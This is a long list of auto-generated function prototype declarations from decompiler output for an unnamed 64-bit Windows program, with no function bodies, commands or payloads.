_QWORD *__fastcall sub_140068350(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4);
_QWORD *__fastcall sub_140068400(_QWORD *a1, __int64 a2, __int64 a3, __int64 **a4);
__int64 *__fastcall sub_1400684A0(_QWORD **a1, __int64 a2, unsigned int *a3);
__int64 *__fastcall sub_140068550(_QWORD **a1, __int64 a2, __int64 **a3);
__int64 __fastcall sub_140068600(__int64 a1, unsigned int a2);
void __fastcall sub_140068710(void **a1);
signed __int64 __fastcall sub_140068730(__int64 **a1);
signed __int64 __fastcall sub_140068770(__int64 **a1);
_QWORD *__fastcall sub_1400687B0(__int64 a1, _QWORD *a2, __int64 a3);
_QWORD *__fastcall sub_140068800(__int64 a1, _QWORD *a2, __int64 a3);
void **__fastcall sub_140068844(__int64 a1, char a2);
void **__fastcall sub_140068850(void *a1, char a2);
bool __fastcall sub_1400688D0(__int64 a1);
__int64 sub_140068930(_QWORD *a1, __int64 a2, _QWORD *a3, ...);
char __fastcall sub_1400689C0(__int64 *a1);
__int64 *__fastcall sub_140068AB0(__int64 a1);
char __fastcall sub_140068B10(__int64 a1);
__int64 __fastcall sub_140068B40(__int64 a1);
__int64 __fastcall sub_140068B90(__int64 a1);
__int64 __fastcall sub_140068BA0(__int64 a1);
__int64 __fastcall sub_140068BB0(__int64 a1);
__int64 __fastcall sub_140068C10(__int64 a1, __int64 a2, __int64 a3, int a4);
void __fastcall sub_140068DE0(__int64 a1, int a2);
__int64 __fastcall sub_140068DF0(__int64 a1);
__int64 __fastcall sub_140068E00(__int64 a1, __int64 a2, __int64 *a3, __int64 a4, char a5);
__int64 __fastcall sub_140068EC0(__int64 a1, __int64 a2, unsigned int *a3);
__int64 __fastcall sub_140068F10(__int64 a1, __int64 a2, __int64 *a3);
void __fastcall sub_140068F60(_QWORD *a1, unsigned __int64 a2);
void __fastcall sub_140069110(_QWORD *a1, unsigned __int64 a2);
__int64 *__fastcall sub_1400692C0(__int64 *a1, __int64 a2, unsigned __int64 a3, unsigned int *a4);
__int64 *__fastcall sub_140069930(__int64 *a1, __int64 a2, unsigned __int64 a3, __int64 **a4);
_QWORD *__fastcall sub_14006A050(_QWORD *a1, _QWORD *a2, __int64 a3);
__int64 *__fastcall sub_14006A070(__int64 *a1, unsigned __int64 a2, unsigned int *a3);
__int64 *__fastcall sub_14006A170(__int64 *a1, unsigned __int64 a2, __int64 **a3);
_QWORD *__fastcall sub_14006A270(__int64 *a1, _QWORD *a2);
_QWORD *__fastcall sub_14006A290(__int64 *a1, _QWORD *a2, __int64 a3, __int64 a4);
_QWORD *__fastcall sub_14006A4C0(__int64 *a1, _QWORD *a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_14006A6F0(__int64 a1, unsigned int *a2);
__int64 __fastcall sub_14006A7D0(__int64 a1, __int64 *a2);
__int64 __fastcall sub_14006A8A0(__int64 a1, unsigned int *a2);
__int64 __fastcall sub_14006A980(__int64 a1, __int64 *a2);
signed __int64 sub_14006AA50();
// __int64 __fastcall sub_14006AC80(_QWORD, _QWORD); weak
_QWORD *__fastcall sub_14006AE50(_QWORD *a1, __int64 a2);
_QWORD *__fastcall sub_14006AEC0(_QWORD *a1, __int64 a2, unsigned __int8 a3);
_QWORD *__fastcall sub_14006AF70(_QWORD *a1, __int64 a2, __int64 a3, unsigned __int8 a4);
_QWORD *__fastcall sub_14006B010(_QWORD *a1, _QWORD *a2, void *a3, _QWORD *a4, __int64 a5, char *a6);
// _QWORD *__usercall sub_14006B2E0@<rax>(_QWORD *a1@<rdx>, void ***a2@<rcx>, _QWORD *a3@<r8>, __int64 a4@<r9>, __int64 a5);
__int64 __fastcall sub_14006B5A0(_QWORD *a1, __int64 a2, void *a3, __int64 a4, char *a5);
_QWORD *__fastcall sub_14006B750(_QWORD *a1, _QWORD *a2, _QWORD *a3, __int64 a4);
__int64 __fastcall sub_14006B7C0(__int64 a1, _QWORD *a2, _QWORD *a3);
void __fastcall sub_14006B860(__int64 a1, __int64 a2);
_QWORD *__fastcall sub_14006B8A0(_QWORD *a1, __int64 a2);
__int64 __fastcall sub_14006B8F0(__int64 a1, __int64 a2);
// void __stdcall unknown_libname_6(void *); idb
std::exception *__fastcall sub_14006B980(std::exception *a1, const struct std::exception *a2);
std::exception *__fastcall sub_14006B9F0(std::exception *a1, const struct std::exception *a2);
std::exception *__fastcall sub_14006BA60(std::exception *a1, const struct std::exception *a2);
// __int64 __fastcall sub_14006BAD0(_QWORD); weak
_QWORD *__fastcall sub_14006BC80(__int64 a1, void **a2);
__int64 __fastcall sub_14006BCD0(__int64 a1, int a2);
__int64 __fastcall sub_14006BCF0(__int64 a1, double a2);
_QWORD *__fastcall sub_14006BD10(__int64 a1, int a2);
__int64 __fastcall sub_14006BDD0(__int64 a1, __int64 a2);
__int64 __fastcall sub_14006BDF0(__int64 a1, __int64 a2);
__int64 __fastcall sub_14006BE10(__int64 a1, char a2);
void __fastcall sub_14006BE30(__int64 a1);
void __fastcall sub_14006BEB0(void *a1);
__int64 __fastcall sub_14006BEC0(__int64 a1);
void __fastcall sub_14006BF10(__int64 a1);
__int64 __fastcall sub_14006BFB0(__int64 a1);
signed __int64 __fastcall sub_14006C0C0(__int64 a1, _QWORD *a2);
signed __int64 __fastcall sub_14006C0F0(__int64 a1, signed int a2);
signed __int64 __fastcall sub_14006C1E0(__int64 a1, unsigned int a2);
signed __int64 __fastcall sub_14006C4B0(__int64 a1, _QWORD *a2);
__int64 __fastcall sub_14006C4D0(__int64 a1, _QWORD *a2);
__int64 __fastcall sub_14006C520(_QWORD **a1, signed int a2);
__int64 __fastcall sub_14006C610(_QWORD **a1, unsigned int a2);
char __fastcall sub_14006C7F0(__int64 a1, __int64 a2);
void __fastcall sub_14006C890(__int64 a1);
void *__fastcall sub_14006C904(__int64 a1, char a2);
void *__fastcall sub_14006C910(__int64 a1, char a2);
_QWORD *__fastcall sub_14006C950(void *a1, char a2);
void sub_14006C9C0();
_QWORD *__fastcall sub_14006CA10(_QWORD *a1);
void __fastcall sub_14006CA70(__int64 a1, char *a2);
void __fastcall sub_14006CAD0(__int64 a1, __int64 *a2);
void __fastcall sub_14006CB60(void **a1, unsigned __int64 a2);
void __fastcall sub_14006CC80(__int64 a1, unsigned __int64 a2);
void __fastcall sub_14006CD10(void **a1);
char __fastcall sub_14006CD90(_BYTE *a1);
double __fastcall sub_14006CED0(_BYTE *a1);
// double __usercall sub_14006D020@<rax>(__int64 a1@<rcx>);
__int64 __fastcall sub_14006D2D0(_QWORD); // weak
__int64 __fastcall sub_14006D2E0(_QWORD); // weak
_QWORD *__fastcall sub_14006D2F0(__int64 a1, _QWORD *a2);
// double __usercall sub_14006D4E0@<rax>(__int64 a1@<rcx>);
// double __usercall sub_14006D7B0@<rax>(double *a1@<rcx>);
_DWORD *__fastcall sub_14006DAF0(void *Src, size_t Size);
_BYTE *__fastcall sub_14006DC70(void *Src, unsigned __int64 a2);
__int64 *__fastcall sub_14006DD30(__int64 **a1, __int64 *a2, __int64 a3, __int64 a4);
_QWORD *__fastcall sub_14006DE30(_QWORD *a1, _QWORD *a2, __int64 *a3);
__int64 __fastcall sub_14006E230(__int64 a1, void *a2, int a3);
__int64 __fastcall sub_14006E4A0(__int64 a1, __int64 a2, _QWORD *a3);
__int64 __fastcall sub_14006E500(__int64 a1, __int64 a2, void *a3, int a4);
__int64 __fastcall sub_14006E540(__int64 a1, __int64 a2, _BYTE *a3);
_QWORD *__fastcall sub_14006E580(__int64 ****a1, _QWORD *a2);
char __fastcall sub_14006E7C0(__int64 a1, unsigned int **a2, _QWORD *a3);
bool __fastcall sub_14006E810(__int64 a1);
char __fastcall sub_14006E820(__int64 a1);
bool __fastcall sub_14006E8C0(__int64 a1, _QWORD *a2);
bool __fastcall sub_14006E900(__int64 a1);
bool __fastcall sub_14006E910(__int64 a1);
char __fastcall sub_14006E920(__int64 a1);
bool __fastcall sub_14006E9A0(__int64 a1);
void __fastcall sub_14006EA40(_QWORD *a1, _QWORD *a2);
signed __int64 __fastcall sub_14006EB90(__int64 a1, _QWORD *a2, int a3);
_BYTE *__fastcall sub_14006EED0(void **a1, _BYTE *a2, unsigned __int64 a3);
_BYTE *__fastcall sub_14006F040(__int64 a1, __int64 *a2, int a3);
_BYTE *__fastcall sub_14006F060(__int64 a1, _BYTE *a2, unsigned __int64 a3, int a4);
__int64 __fastcall sub_14006F110(char *a1);
_QWORD *__fastcall sub_14006F1C0(__int64 a1, _QWORD *a2);
__int64 __fastcall sub_14006F1F0(__int64 *a1, __int64 *a2);
void __fastcall sub_14006F240(_QWORD *a1);
void __fastcall sub_14006F2C0(_QWORD *a1);
// __int64 __fastcall DName::status(_QWORD); weak
_QWORD *__fastcall sub_14006F350(__int64 a1);
__int64 __fastcall sub_14006F360(_QWORD *a1);
_QWORD *__fastcall sub_14006F400(_QWORD *a1, _QWORD *a2, char a3);
_QWORD *__fastcall sub_14006F4A0(_QWORD *a1);
void __fastcall sub_14006F5A0(__int64 a1);
void *__fastcall sub_14006F614(__int64 a1, char a2);
void *__fastcall sub_14006F620(__int64 a1, char a2);
void __fastcall sub_14006F660(_QWORD *a1, unsigned __int64 a2);
void __fastcall sub_14006F810(__int64 a1, char *a2, char *a3, int a4);
char __fastcall sub_14006F8A0(__int64 a1, void **a2, __int64 a3, __int64 a4);
// __int64 __fastcall std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t>>::back(_QWORD); weak
__int64 __fastcall sub_14006FBF0(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_14006FEB0(__int64 *a1, __int64 a2);
// __int64 __fastcall sub_14006FF70(_QWORD, _QWORD, _QWORD); weak
__int64 __fastcall sub_1400700E0(__int64 *a1, __int64 a2);
// __int64 __fastcall sub_1400701E0(_QWORD, _QWORD, _QWORD); weak
char __fastcall sub_140070970(__int64 a1, __int64 a2, __int64 *a3, __int64 a4, int *a5);
char __fastcall sub_140070B00(__int64 a1, __int64 a2, __int64 *a3, __int64 a4, int *a5);
_QWORD *__fastcall sub_140070CD0(__int64 *a1, _QWORD *a2);
_QWORD *__fastcall sub_140070CF0(void *Src, char *a2, char *a3);
char __fastcall sub_140070EE0(__int64 a1, _QWORD *a2, __int64 a3, char a4);
char __fastcall sub_140070F50(__int64 a1, __int64 a2, __int64 a3, __int64 a4, char a5);
__int64 __fastcall sub_140071150(_QWORD *a1, __int64 a2);
__int64 __fastcall sub_140071240(__int64 a1);
char __fastcall sub_140071590(__int64 a1);
char *__fastcall sub_1400716E0(__int64 a1);
__int64 __fastcall sub_1400717B0(__int64 a1);
bool __fastcall sub_140071D60(__int64 a1);
char __fastcall sub_140071DB0(__int64 a1, __int64 a2);
// __int64 __fastcall sub_1400720D0(_QWORD); weak
char __fastcall sub_140072390(__int64 a1, int a2);
void __fastcall sub_140072400(_QWORD *a1, unsigned __int64 a2);
char __fastcall sub_1400724B0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140072820(__int64 a1);
__int64 __fastcall sub_140072850(__int64 a1);
__int64 __fastcall sub_140072870(__int64 a1);
// __int64 __fastcall sub_140072880(void *Dst); idb
void *__fastcall sub_140072EB0(void *a1, double a2);
_QWORD *__fastcall sub_140072EE0(void *Dst, double a2, char a3, unsigned int a4);
_QWORD *__fastcall sub_140073060(void *Dst, signed __int64 a2);
void *__fastcall sub_1400731B0(void *Dst, unsigned __int64 a2);
void *__fastcall sub_140073260(void *Dst, char a2);
_QWORD *__fastcall sub_1400732C0(__int64 a1, _QWORD *a2, char *a3);
void __fastcall sub_140073360(__int64 a1, char *a2);
void __fastcall sub_140073AC0(void *Src, char *a2, char *a3);
__int64 *__fastcall sub_140073C10(__int64 *a1, __int64 a2, __int64 a3, char *a4, char *a5);
bool __fastcall sub_140073D00(const CHAR *a1);
bool sub_140073ED0();
bool __fastcall sub_140073EE0(unsigned __int16 a1, unsigned __int16 a2, WORD a3);
__int64 __fastcall sub_140073FC0(__int64 a1, signed __int64 a2, signed __int64 a3, _QWORD *a4);
__int64 __fastcall sub_140074100(__int64 a1, __int64 *a2);
__int64 __fastcall sub_1400741D0(_QWORD *a1, __int64 a2);
_QWORD *__fastcall sub_1400742B0(_QWORD *a1, _QWORD *a2, _QWORD *a3);
__int64 *__fastcall sub_140074370(__int64 *a1, __int64 *a2, __int64 *a3);
__int64 __fastcall sub_1400743E0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140074420(_QWORD *a1, __int64 a2);
void __fastcall sub_140074490(_QWORD *a1);
_QWORD *__fastcall sub_140074570(_BYTE *a1);
_QWORD *__fastcall sub_1400745E0(_QWORD *a1);
__int64 __fastcall sub_140074690(volatile signed __int32 ***a1);
__int64 __fastcall sub_1400746D0(__int64 a1);
_QWORD *__fastcall sub_140074710(_QWORD *a1, __int64 *a2);
char *__fastcall sub_140074790(void *a1, char a2);
void *__fastcall sub_140074810(void *a1, char a2);
void __fastcall sub_140074840(__int64 a1, __int64 *a2, __int64 a3);
char __fastcall sub_140074950(__int64 a1, __int64 *a2, __int64 a3);
// __int64 __fastcall sub_140074A50(_QWORD, _QWORD); weak
__int64 __fastcall sub_140074B40(__int64 a1);
char __fastcall sub_140074BE0(__int64 a1);
unsigned __int64 __fastcall sub_140074C30(__int64 a1);
_BOOL8 __fastcall sub_140074CA0(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_140074DB0(__int64 a1);
void __fastcall sub_140074F20(__int64 a1);
void __fastcall sub_140074F90(__int64 a1);
signed __int64 __fastcall sub_140074FC0(__int64 a1, volatile signed __int32 **a2, volatile signed __int32 **a3);
signed __int64 __fastcall sub_140075030(void **a1, unsigned __int64 a2);
void __fastcall sub_140075120(__int64 a1, unsigned __int64 a2);
__int64 __fastcall sub_1400751F0(void **a1, unsigned __int64 a2);
void __fastcall sub_140075290(_QWORD *a1, unsigned __int64 a2);
void __fastcall sub_140075320(__int64 a1, _QWORD *a2);
_QWORD *__fastcall sub_140075500(void *Dst, _DWORD *(__fastcall *a2)(void *Src));
// _QWORD *__usercall sub_1400756C0@<rax>(void *Src@<rcx>, unsigned __int64 a2@<rdx>, size_t a3@<r8>, size_t a4@<r9>, char a5);
__int64 __fastcall sub_1400758A0(__int64 a1, _QWORD *a2, __int64 a3);
__int64 __fastcall sub_140075A80(__int64 a1, _QWORD *a2, __int64 a3);
__int64 __fastcall sub_140075C60(__int64 a1, signed __int64 a2, signed __int64 a3, _QWORD *a4);
__int64 __fastcall sub_140075DD0(_QWORD *a1, __int64 a2);
_QWORD *__fastcall sub_140075EB0(_QWORD *a1, __int64 *a2);
__int64 __fastcall sub_140075F30(__int64 a1);
_BOOL8 __fastcall sub_140075FD0(__int64 a1);
__int64 __fastcall sub_140076030(__int64 a1);
void __fastcall sub_1400760E0(__int64 a1);
char __fastcall sub_140076170(__int64 a1);
char __fastcall sub_140076180(__int64 a1, __int64 a2);
char __fastcall sub_140076260(__int64 a1);
void __fastcall sub_1400762E0(__int64 a1);
__int64 __fastcall sub_1400763C0(std::_Pad *a1);
__int64 __fastcall sub_1400763F0(__int64 a1);
_QWORD *__fastcall sub_140076470(_QWORD *a1, _QWORD *a2, _QWORD *a3);
__int64 __fastcall sub_1400764B0(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
char *__fastcall sub_140076500(_OWORD *a1);
char *__fastcall sub_1400765B0(__int64 a1);
char **__fastcall sub_140076670(char **a1, _OWORD *a2);
char **__fastcall sub_1400766A0(char **a1, __int64 a2);
_QWORD *__fastcall sub_1400766D0(__int64 a1, _QWORD *a2, _QWORD *a3, _QWORD *a4);
// __int64 __fastcall sub_1400769E0(_QWORD, _QWORD); weak
void __fastcall sub_140076A60(void ***a1);
void __fastcall sub_140076A80(__int64 *a1);
// __int64 sub_140076AD0(void); weak
void *__fastcall sub_140076C10(void *a1, char a2);
_QWORD *__fastcall sub_140076C40(_QWORD *a1, char a2);
BOOL __fastcall sub_140076C70(__int64 a1);
_QWORD *__fastcall sub_140076FC0(void *Src);
_QWORD *__fastcall sub_140077190(void *Src);
void __fastcall sub_140077370(__int64 a1, void *a2);
_BOOL8 __fastcall sub_140077630(__int64 a1);
_BOOL8 __fastcall sub_140077750(__int64 a1);
bool __fastcall sub_140077760(__int64 a1);
// __int64 __fastcall sub_140077800(_QWORD, _QWORD, _QWORD); weak
void __fastcall sub_140077860(void ***a1);
__int64 __fastcall sub_140077900(__int64 a1);
_QWORD *__fastcall sub_140077920(_QWORD *a1, __int64 a2, _QWORD **a3);
_QWORD *__fastcall sub_140077970(_QWORD *a1, _QWORD *a2, void *a3, _QWORD *a4, __int64 a5, _QWORD *a6);
// _QWORD *__usercall sub_140077C20@<rax>(void *a1@<rcx>, _QWORD *a2@<rdx>, __int64 a3@<r8>, unsigned __int64 *a4@<r9>, __int64 a5);
__int64 __fastcall sub_140077E80(void *a1, __int64 a2, void *a3, unsigned __int64 *a4, void *a5);
char *__fastcall sub_140077FE0(_OWORD *a1);
char **__fastcall sub_140078090(char **a1, _OWORD *a2);
// __int64 __fastcall sub_1400780C0(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD); weak
void __fastcall sub_140078250(_QWORD *a1);
void __fastcall sub_140078280(__int64 **a1);
__int64 (__fastcall **__fastcall sub_1400782B0(_QWORD *a1))();
void *__fastcall sub_1400783D0(void *a1, char a2);
char __fastcall sub_140078400(__int64 a1);
_BOOL8 __fastcall sub_140078550(__int64 a1);
bool __fastcall sub_140078560(__int64 a1);
_QWORD *__fastcall sub_1400786E0(void *Src);
_QWORD *__fastcall sub_1400788B0(void *Src);
// __int64 __fastcall sub_140078A90(_QWORD, _QWORD); weak
BOOL __fastcall sub_140078D10(__int64 a1);
void sub_140079220();
_QWORD *__fastcall sub_140079270(_QWORD *a1);
void __fastcall sub_1400792D0(__int64 a1, void *a2);
__int64 __fastcall sub_140079320(_QWORD *a1);
__int64 *__fastcall sub_140079390(__int64 **a1, __int64 *a2, __int64 a3, __int64 a4);
__int64 *__fastcall sub_140079470(_QWORD *a1, __int64 *a2, __int64 a3);
int *sub_140079840();
char *sub_140079990();
_BOOL8 __fastcall sub_140079B40(HANDLE handle);
_BOOL8 __fastcall sub_140079BF0(LPSTR pObjectName);
_QWORD *__fastcall sub_140079CB0(_QWORD *a1, _BYTE *a2);
void __fastcall sub_140079DA0(__int64 a1);
__int64 __fastcall sub_140079F00(int csidl, void *Src); // idb
_QWORD *__fastcall sub_14007A100(_QWORD *a1);
_QWORD *sub_14007A1A0();
_QWORD *__fastcall sub_14007A230(void *Src);
_QWORD *__fastcall sub_14007A400(void *Src);
void __fastcall sub_14007A5C0(int a1, void **a2);
__int64 __fastcall sub_14007A720(__int64 a1, __int64 a2, _BYTE *a3, char a4);
__int64 __fastcall sub_14007A7E0(__int64 a1, __int64 a2, _BYTE *a3, char a4);
_QWORD *__fastcall sub_14007A870(__int64 a1, __int64 a2, unsigned __int64 a3, __int64 a4);
_QWORD *__fastcall sub_14007A980(__int64 a1, __int64 a2, unsigned __int64 a3, __int64 a4);
_QWORD *__fastcall sub_14007AA90(_QWORD *a1);
_QWORD *__fastcall sub_14007AB00(_QWORD *a1);
__int64 __fastcall sub_14007AB70(__int64 a1, __int64 a2);
_QWORD *__fastcall sub_14007ABF0(_QWORD *a1, __int64 a2);
_QWORD *__fastcall sub_14007AC40(_QWORD *a1, __int64 a2, char a3, int a4);
__int64 __fastcall sub_14007AD40(__int64 a1, __int64 a2);
__int64 __fastcall sub_14007ADD0(__int64 a1);
__int64 __fastcall sub_14007AE50(__int64 a1, __int64 a2);
_QWORD *__fastcall sub_14007AEC0(__int64 a1, __int64 a2);
_QWORD *__fastcall sub_14007AF30(__int64 a1, _QWORD *a2, char a3, __int64 a4);
signed __int64 __fastcall sub_14007B050(__int64 a1);
signed __int64 __fastcall sub_14007B0C0(__int64 a1);
__int64 __fastcall sub_14007B130(__int64 a1);
void __fastcall sub_14007B160(__int64 a1);
// __int64 __cdecl sub_14007B1B0(_QWORD); weak
// __int64 sub_14007B220(void); weak
void *__fastcall sub_14007B298(__int64 a1, char a2);
void *__fastcall sub_14007B2A4(__int64 a1, char a2);
void *__fastcall sub_14007B2B0(__int64 a1, char a2);
void *__fastcall sub_14007B2BC(__int64 a1, char a2);
void *__fastcall sub_14007B2C8(__int64 a1, char a2);
void *__fastcall sub_14007B2D4(__int64 a1, char a2);
_QWORD *__fastcall sub_14007B2E0(__int64 a1, char a2);
void *__fastcall sub_14007B2EC(__int64 a1, char a2);
_QWORD *__fastcall sub_14007B2F8(__int64 a1, char a2);
void *__fastcall sub_14007B304(__int64 a1, char a2);
void *__fastcall sub_14007B310(void *a1, char a2);
void *__fastcall sub_14007B340(void *a1, char a2);
void *__fastcall sub_14007B370(void *a1, char a2);
_QWORD *__fastcall sub_14007B3A0(void *a1, char a2);
void *__fastcall sub_14007B410(void *a1, char a2);
_QWORD *__fastcall sub_14007B440(void *a1, char a2);
void *__fastcall sub_14007B4B0(void *a1, char a2);
_QWORD *__fastcall sub_14007B4E0(__int64 a1, _QWORD *a2);
_QWORD *__fastcall sub_14007B510(__int64 a1, _QWORD *a2);
_QWORD *__fastcall sub_14007B540(__int64 a1, _QWORD *a2);
signed __int64 sub_14007B600();
bool __fastcall sub_14007B610(__int64 a1);
__int64 __fastcall sub_14007B620(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
_QWORD *__fastcall sub_14007B6A0(__int64 a1, _QWORD *a2, _QWORD *a3, __int64 *a4);
signed __int64 __fastcall sub_14007B6D0(__int64 a1);
_QWORD *__fastcall sub_14007B740(__int64 a1, _QWORD *a2, _QWORD *a3, __int64 *a4, char a5);
__int64 __fastcall sub_14007BB80(__int64 a1);
signed __int64 __fastcall sub_14007BB90(__int64 a1);
unsigned __int64 __fastcall sub_14007BBA0(__int64 a1);
_QWORD *__fastcall sub_14007BBB0(void *Src);
_QWORD *__fastcall sub_14007BD80(void *Src);
unsigned __int64 __fastcall sub_14007BF20(__int64 a1, unsigned __int64 a2);
__int64 __fastcall sub_14007BF30(__int64 a1);
signed __int64 sub_14007BF60();
_QWORD *__fastcall sub_14007BF70(_QWORD *a1);
_QWORD *__fastcall sub_14007C080(_QWORD *a1);
_QWORD *__fastcall sub_14007C190(void *Dst);
_QWORD *__fastcall sub_14007C250(__int64 a1, _QWORD *a2, _QWORD *a3, __int64 *a4);
__int64 __fastcall sub_14007C280(__int64 a1, __int64 a2, __int64 a3, _QWORD *a4);
bool __fastcall sub_14007C3C0(__int64 a1, _QWORD *a2);
// __int64 __fastcall sub_14007C440(_QWORD, _QWORD, _QWORD); weak
_QWORD *__fastcall sub_14007C530(_QWORD *a1, const CHAR *a2);
_QWORD *__fastcall sub_14007C590(_QWORD *a1, const CHAR *a2);
_QWORD *__fastcall sub_14007C5F0(_QWORD *a1);
_QWORD *__fastcall sub_14007C640(_QWORD *a1, const CHAR *a2, const CHAR *a3);
// __int64 __fastcall sub_14007C6B0(_QWORD, _QWORD); weak
_QWORD *__fastcall sub_14007C710(_QWORD *a1, __int64 *a2);
_QWORD *__fastcall sub_14007C750(_QWORD *a1);
__int64 __fastcall sub_14007C7D0(__int64 a1);
__int64 (__fastcall **__fastcall sub_14007C820(_QWORD *a1))();
_QWORD *__fastcall sub_14007C8F0(_QWORD *a1, char a2);
void *__fastcall sub_14007C920(void *a1, char a2);
__int64 __fastcall sub_14007C950(__int64 a1, __int64 a2, unsigned int a3);
__int64 __fastcall sub_14007C9A0(__int64 a1, __int64 a2, unsigned int a3);
__int64 __fastcall sub_14007C9F0(__int64 a1, unsigned int a2, __int64 a3);
char *sub_14007CA80();
char *sub_14007CC30();
// DWORD __stdcall GetCurrentProcessId();
__int64 sub_14007CE00();
__int64 __fastcall sub_14007CEB0(__int64 a1, __int64 a2, unsigned int a3);
__int64 __fastcall sub_14007CF00(__int64 a1, __int64 a2);
_QWORD *__fastcall sub_14007CF40(void *Src);
char *sub_14007D150();
_QWORD *__fastcall sub_14007D280(void *Src);
_QWORD *__fastcall sub_14007D460(void *Src);
__int64 __fastcall sub_14007D640(__int64 a1);
__int64 __fastcall sub_14007D6A0(__int64 a1);
char __fastcall sub_14007D700(__int64 a1, DWORD a2);
void __fastcall sub_14007D770(__int64 a1);
void __fastcall sub_14007D8B0(__int64 a1);
void __fastcall sub_14007D9F0(__int64 a1);
void __fastcall sub_14007DBC0(__int64 a1);
char __fastcall sub_14007DD00(__int64 a1, DWORD a2);
char __fastcall sub_14007DD70(__int64 a1, DWORD a2);
// __int64 __fastcall sub_14007DDE0(_QWORD, _QWORD, _QWORD); weak
void __fastcall sub_14007DED0(__int64 a1, int *a2, const void *a3, __int64 a4);
void __fastcall sub_14007E0A0(int *a1, __int64 a2, __int64 a3);
_QWORD *__fastcall sub_14007E160(_QWORD *a1, const CHAR *a2, const CHAR *a3);
__int64 __fastcall sub_14007E210(void **a1);
__int64 (__fastcall **__fastcall sub_14007E240(_QWORD *a1))();
_QWORD *__fastcall sub_14007E250(void *a1, char a2);
_QWORD *__fastcall sub_14007E2C0(_QWORD *a1, char a2);
char *sub_14007E2F0();
_QWORD *__fastcall sub_14007E510(__int64 a1, __int64 a2, DWORD a3);
char *sub_14007E730();
_QWORD *__fastcall sub_14007E960(_QWORD *a1, const CHAR *a2);
_QWORD *__fastcall sub_14007E9D0(void *a1, char a2);
char *sub_14007EA30();
unsigned __int64 *__fastcall sub_14007EBD0(__int64 a1, unsigned __int64 *a2);
__int64 __fastcall sub_14007EE50(_QWORD *a1, __int64 a2, __int64 a3);
_QWORD *__fastcall sub_14007EED0(_QWORD *a1, const CHAR *a2);
_QWORD *__fastcall sub_14007EF50(void *a1, char a2);
void ***__fastcall sub_14007EFC0(__int64 a1, void ***a2, DWORD a3);
char *sub_14007F4E0();
__int64 __fastcall sub_14007F710(__int64 a1);
signed __int64 __fastcall sub_14007F740(__int64 a1, __int64 a2);
_QWORD *__fastcall sub_14007F780(_QWORD *a1, const CHAR *a2);
_QWORD *__fastcall sub_14007F7F0(void *a1, char a2);
void ***__fastcall sub_14007F860(__int64 a1, void ***a2, DWORD a3);
char *sub_14007FD80();
void __fastcall sub_14007FFB0(void *Src, char *a2, char *a3);
__int64 __fastcall sub_1400800F0(__int64 a1, DWORD a2, __int64 a3);
char *sub_140080580();
char *sub_1400806E0();
_QWORD *__fastcall sub_140080910(_QWORD *a1, _BYTE *a2);
bool __fastcall sub_140080A00(char *a1, _QWORD *a2, __int64 *a3);
__int64 __fastcall sub_140080B30(__int64 *a1);
void __fastcall sub_140080C40(__int64 *a1);
_QWORD *__fastcall sub_140080C70(__int64 a1, void *a2);
HANDLE __fastcall sub_140080F70(DWORD dwProcessId, DWORD **a2);
bool sub_140080FC0();
_QWORD *__fastcall sub_140081140(_QWORD *a1, _QWORD *a2);
_QWORD *__fastcall sub_1400811B0(_QWORD *a1, __int64 a2, unsigned __int8 a3);
_QWORD *__fastcall sub_140081260(_QWORD *a1, __int64 a2, __int64 a3, unsigned __int8 a4);
_QWORD *__fastcall sub_140081300(_QWORD *a1, __int64 a2);
_QWORD *__fastcall sub_140081350(_QWORD *a1, _QWORD *a2);
__int64 __fastcall sub_140081410(__int64 a1, const char *a2);
_QWORD *__fastcall sub_140081520(void *Src);
_QWORD *__fastcall sub_140081730(void *Src);
__int64 __fastcall sub_140081940(__int64 a1, const char *a2);
void *__fastcall sub_140081A60(void *Src);
_QWORD *__fastcall sub_140081CE0(_QWORD *a1, _QWORD *a2, _QWORD *a3);
// __int64 __fastcall sub_140081D40(_QWORD, _QWORD); weak
unsigned __int64 __fastcall sub_140081E80(__int64 *a1, __int64 a2);
_QWORD *__fastcall sub_140081FB0(void *Src);
_QWORD *__fastcall sub_140082180(void *Src);
_QWORD *__fastcall sub_140082390(void *Src);
_QWORD *__fastcall sub_140082560(void *Src);
_DWORD *__fastcall sub_140082740(void *Src);
_QWORD *__fastcall sub_1400828E0(void *Src);
_QWORD *__fastcall sub_140082AA0(void *Src);
_QWORD *__fastcall sub_140082CB0(void *Src);
__int64 __fastcall sub_1400836B0(__int64 a1);
unsigned __int64 __fastcall sub_1400836C0(_QWORD *a1, unsigned __int64 a2);
signed __int64 __fastcall sub_140083720(__int64 *a1, unsigned __int64 a2);
__int64 __fastcall sub_140083830(__int64 *a1, unsigned __int64 a2);
_QWORD *__fastcall sub_1400838D0(__int64 a1, _QWORD *a2);
_QWORD *__fastcall sub_1400839E0(void *Dst, __int64 a2);
_QWORD *__fastcall sub_140083EB0(void *Src);
void **__fastcall sub_1400841B0(void *Src);
void **__fastcall sub_1400848C0(void *Src);
void **__fastcall sub_140084FD0(void *Src);
void **__fastcall sub_1400856E0(void *Src);
_QWORD *__fastcall sub_140085DF0(void *Src);
// __int64 __fastcall unknown_libname_8(_QWORD); weak
void *__stdcall operator new(unsigned __int64); // idb
// void *__stdcall operator new(unsigned __int64); idb
// void __cdecl operator delete(void *); idb
// int __cdecl atexit(void (__cdecl *)());
// __int64 __fastcall CxxThrowException(_QWORD, _QWORD); weak
// void __cdecl _security_check_cookie(uintptr_t StackCookie);
// void *__cdecl memcpy(void *Dst, const void *Src, size_t Size);
// void *__cdecl memset(void *Dst, int Val, size_t Size);
// int __cdecl memcmp(const void *Buf1, const void *Buf2, size_t Size);
// void __fastcall `eh vector destructor iterator'(void *, unsigned __int64, int, void (__stdcall *)(void *)); idb
// void __cdecl operator delete[](void *); idb
// void __fastcall `eh vector constructor iterator'(void *, unsigned __int64, int, void (__stdcall *)(void *), void (__stdcall *)(void *)); idb
// int __cdecl strcmp(const char *Str1, const char *Str2);
// double __cdecl log(double X);
// double __cdecl pow(double X, double Y);
void sub_140086E4C();
void __cdecl sub_140086E84(); // idb
